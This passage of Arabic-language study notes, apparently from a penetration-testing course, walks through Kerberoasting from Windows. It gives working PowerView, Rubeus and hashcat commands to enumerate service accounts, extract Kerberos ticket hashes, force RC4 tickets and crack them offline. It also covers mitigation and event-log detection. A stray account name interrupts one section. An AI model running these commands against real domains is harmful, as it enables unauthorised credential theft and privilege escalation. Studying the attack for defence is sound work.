والـ `23` هنا:

```text
Kerberos etype 23
=
RC4-HMAC
```

---

## 14. Hashcat

بعد كده:

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

يعني:

```text
-m 13100
```

اختار Kerberos TGS-REP RC4.

والـ wordlist:

```text
rockyou.txt
```

وفي المثال النتيجة:

```text
database!
```

إذن:

```text
TGS
 ↓
Extract
 ↓
Hashcat
 ↓
database!
```

---

## 15. الطريقة اليدوية vs Linux

الفرق الأساسي:

### Linux

```text
GetUserSPNs.py
 ↓
TGS
 ↓
Hashcat
```

### Windows manual

```text
setspn
 ↓
PowerShell
 ↓
TGS في Memory
 ↓
Mimikatz
 ↓
.kirbi
 ↓
kirbi2john
 ↓
Hashcat
```

عشان كده Linux method أسهل بكتير.

---

## 16. PowerView — الطريقة الأسرع

بدل كل الخطوات دي، نستخدم:

```powershell
Import-Module .\PowerView.ps1
```

وبعدين:

```powershell
Get-DomainUser * -spn | select samaccountname
```

النتيجة مثلًا:

```text
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

دي الحسابات اللي عندها:

```text
SPN
```

يعني Kerberoastable accounts.

---

## 17. طلب TGS وتحويله Hashcat Format مباشرة

بدل:

```text
Request TGS
 ↓
Mimikatz
 ↓
.kirbi
 ↓
kirbi2john
 ↓
sed
```

PowerView يعملها تقريبًا في خطوة واحدة:

```powershell
Get-DomainUser -Identity sqldev |
Get-DomainSPNTicket -Format Hashcat
```
svc_vmwaresso
فتاخد مباشرة:

```text
Hash : $krb5tgs$23$...
```

وده جاهز لـ Hashcat.

وده سبب إن PowerView أسرع بكتير من الـ manual method.

---

## 18. تصدير كل الـ TGS إلى CSV

```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket -Format Hashcat |
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

الفكرة:

```text
كل Service Accounts
        ↓
Request TGS
        ↓
Convert Hashcat format
        ↓
CSV
```

وبالتالي تقدر تنقل الـ CSV للـ attack machine وتعمل cracking offline.

---

## 19. Rubeus

وده أهم Tool في الجزء ده.

بدل ما تعمل كل الكلام السابق،:

```powershell
.\Rubeus.exe kerberoast
```

Rubeus يعمل معظم العملية تلقائيًا.

---

## أهم خيارات Rubeus

### كل الـ Kerberoastable Accounts

```powershell
Rubeus.exe kerberoast
```

---

### User معين

```powershell
Rubeus.exe kerberoast /user:sqldev
```

يعني:

> اعمل Kerberoast للـ `sqldev` فقط.

---

### SPN معين

```text
/spn:"MSSQLSvc/..."
```

---

### حفظ الـ hashes

```text
/outfile:hashes.txt
```

---

### بدون wrapping

```text
/nowrap
```

ودي مهمة جدًا.

بدل ما الـ hash يطلع:

```text
$krb5tgs$23$....
............
............
```

يطلع كله في سطر واحد.

وده يسهل جدًا نسخه لـ Hashcat.

---

## 20. `/stats` مهم جدًا

```powershell
Rubeus.exe kerberoast /stats
```

الميزة هنا:

> يعمل enumeration وتحليل، **من غير ما يطلب TGS tickets**.

المثال وجد:

```text
Total kerberoastable users : 9
```

ومنهم:

```text
RC4 : 7
AES : 2
```

وكمان:

```text
Password Last Set Year
2022 : 9
```

فأنت قبل ما تبدأ تطلب tickets ممكن تعرف:

```text
كام account؟
أنواع encryption؟
إمتى passwords اتغيرت؟
```

---

## 21. ليه `PwdLastSet` مهم؟

لو لقيت Service Account:

```text
Password Last Set:
2010
```

ده ممكن يكون interesting لأن password قديمة جدًا.

لكن:

> ده مش معناه تلقائيًا إن password ضعيفة.

هو مجرد indicator يستحق التحقيق.

---

### 22. `admincount=1`

المثال يستخدم:

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

يعني:

> اطلب TGS فقط للحسابات اللي `adminCount = 1`.

وده بيفلتر الحسابات اللي Active Directory يعتبرها مرتبطة بحسابات/مجموعات إدارية محمية.

في المثال:

```text
Total kerberoastable users : 3
```

ومنهم:

```text
backupagent
```

وده أحسن من إنك تبدأ بـ 50 أو 100 account وتعمل cracking لكل حاجة.

---

### 23. أهم جزء: Encryption Types

دي نقطة مهمة جدًا.

Kerberos ممكن يستخدم encryption types مختلفة.

في الجزء ده أهم 3:

|Type|Encryption|
|---|---|
|23|RC4-HMAC|
|17|AES128|
|18|AES256|

وعشان كده الـ hash بيبدأ مثلًا:

```text
$krb5tgs$23$
```

أو:

```text
$krb5tgs$18$
```

---

## 24. ليه RC4 أسهل في الـ Cracking؟

الـ TGS نفسه مش هو password.

الفكرة إن الـ TGS-REP يحتوي بيانات مشفرة باستخدام secret مرتبط بالـ service account.

فلو حصلنا على الـ TGS:

```text
TGS
 ↓
Offline password guessing
```

### RC4

أسرع في cracking.

Hashcat:

```text
13100
```

### AES256

أبطأ بكثير.

Hashcat:

```text
19700
```

وده لا يعني إن AES مستحيل يتكسر.

لو password:

```text
welcome1
```

مثلًا، فممكن تتكسر.

لكن لو password قوية وعشوائية:

```text
long-random-unique-secret...
```

الـ offline attack يبقى أصعب جدًا.

---

## 25. `msDS-SupportedEncryptionTypes`

ده Attribute في Active Directory بيحدد الـ encryption types المدعومة للحساب.

في المثال:

```text
0
```

معناه حسب الـ source:

```text
default behavior
→ RC4_HMAC_MD5
```

وبالتالي:

```text
Rubeus
 ↓
TGS
 ↓
$krb5tgs$23$
```

---

بعد تعديل الحساب:

```text
msDS-SupportedEncryptionTypes = 24
```

المثال يوضح إن:

```text
24
```

يعني:

```text
AES128
+
AES256
```

فبقى الـ hash:

```text
$krb5tgs$18$
```

---

## 26. AES256 Hashcat

لما نشوف:

```text
$krb5tgs$18$
```

نستخدم:

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

الفرق في السرعة كان واضح جدًا في المثال:

```text
RC4:
~693 kH/s

AES256:
~10 kH/s
```

يعني AES أبطأ بحوالي عشرات المرات في المثال.

وده سبب إن استخدام AES بيصعّب Kerberoasting، **لكن لا يمنعه**.

---

## 27. `/tgtdeleg` — محاولة الحصول على RC4

Rubeus عنده:

```text
/tgtdeleg
```

الفكرة في المثال:

```text
Account supports AES
        ↓
Normally → AES TGS
        ↓
/tgtdeleg
        ↓
Request RC4
```

وده مهم لأن:

```text
RC4 → cracking أسرع
AES → cracking أبطأ
```

لكن فيه نقطة مهمة جدًا في الـ source:

> السلوك ده يعتمد على إصدار Domain Controller.

المثال يوضح أن الطريقة دي لا تعمل بنفس الشكل مع **Windows Server 2019 DC**؛ وفي الحالة دي الـ DC يرجع أعلى encryption type مدعوم للحساب.

فما تحفظش:

```text
/tgtdeleg = always downgrade AES → RC4
```

احفظ:

> `tgtdeleg` technique مرتبطة بقدرة/سلوك الـ DC والـ account encryption configuration.

---

## 28. Mitigation

لو عندك Service Account عادي:

أكبر مشكلة:

```text
SPN
+
Password ضعيفة
```

الحل الأساسي:

### Password قوية

Password طويلة وعشوائية ومش موجودة في wordlists.

لكن الأفضل للـ service accounts:

### MSA / gMSA

خصوصًا:

```text
gMSA
```

لأن Windows يدير password معقدة ويعمل لها rotation تلقائي.

فبدل:

```text
sqlservice
Password: Summer2020!
```

يبقى الحساب managed والـ password مش أنت اللي بتديرها يدويًا.

---

## 29. Detection

Kerberoasting يعتمد على طلب:

```text
TGS
```

فممكن تراقب Kerberos service-ticket activity.

أهم Event هنا:

```text
4769
```

معناه:

> Kerberos service ticket was requested.

وكذلك:

```text
4770
```

يعني:

> Kerberos service ticket was renewed.

لو مستخدم عادي فجأة بيطلب عدد كبير من TGS tickets في فترة قصيرة، ده ممكن يكون indicator.

لكن خلي بالك:

> وجود 4769 لوحده مش معناه Kerberoasting.

لأن TGS requests طبيعية جدًا في Active Directory.

المهم هو **pattern والسياق**.

---

## 30. الصورة الكاملة للجزء ده

احفظها بالشكل ده:

```text
              Windows Host
                   │
                   ▼
             Enumerate SPNs
                   │
          ┌────────┴────────┐
          │                 │
       setspn            PowerView
          │                 │
          └────────┬────────┘
                   ▼
             Service Account
                   │
                   ▼
                Request
                 TGS
                   │
          ┌────────┴────────┐
          │                 │
      Manual route       Rubeus
          │                 │
      Mimikatz              │
          │                 │
        .kirbi              │
          │                 │
     kirbi2john             │
          │                 │
          └────────┬────────┘
                   ▼
             Hashcat format
                   │
                   ▼
                Hashcat
                   │
          ┌────────┴────────┐
          │                 │
       RC4 23            AES256 18
       13100               19700
          │                 │
          └────────┬────────┘
                   ▼
              Password
                   │
                   ▼
          Check privileges/access
```

## أهم حاجة تخرج بيها من الـ Module

**Kerberoasting مش معناه "سرقة باسورد من Kerberos".**

أنت بتعمل:

```text
1. Find SPN
2. Identify service account
3. Request TGS legitimately
4. Get encrypted TGS
5. Take it offline
6. Crack it
7. Recover service-account password
8. Use privileges of that account
```

والـ Windows section هنا بيوريك **3 مستويات من التنفيذ**:

```text
Manual:
setspn + PowerShell + Mimikatz

Semi-automated:
PowerView

Automated:
Rubeus
```

والـ أهم concept في آخر الجزء:

```text
RC4  → $krb5tgs$23$ → Hashcat 13100 → أسرع
AES  → $krb5tgs$18$ → Hashcat 19700 → أبطأ
```

وبعد ما تطلع الـ credentials، **Kerberoasting خلص**؛ الخطوة التالية هي تحديد إيه الـ access والـ privileges اللي الحساب ده بيديك إياها: RDP/WinRM، SMB، MSSQL، local admin، أو أحيانًا privileges أعلى.



# Layer 19

